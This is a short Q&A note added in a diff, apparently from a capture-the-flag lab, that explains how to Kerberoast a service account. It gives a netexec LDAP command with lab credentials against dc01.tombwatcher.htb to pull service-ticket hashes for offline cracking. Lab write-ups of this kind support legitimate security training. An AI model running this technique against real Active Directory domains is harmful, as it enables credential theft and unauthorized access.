@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What steps should you take to Kerberoast a service account?
+
+CONTEXT:
+You have identified a user 'Alfred' with a service principal name (SPN).
+
+METHOD / ANSWER:
+Command: `netexec ldap dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' -k --kerberoasting kerberoasting.hashes`
+Explanation: This command retrieves the TGS for the target service account, allowing you to crack the password offline if it is weak.
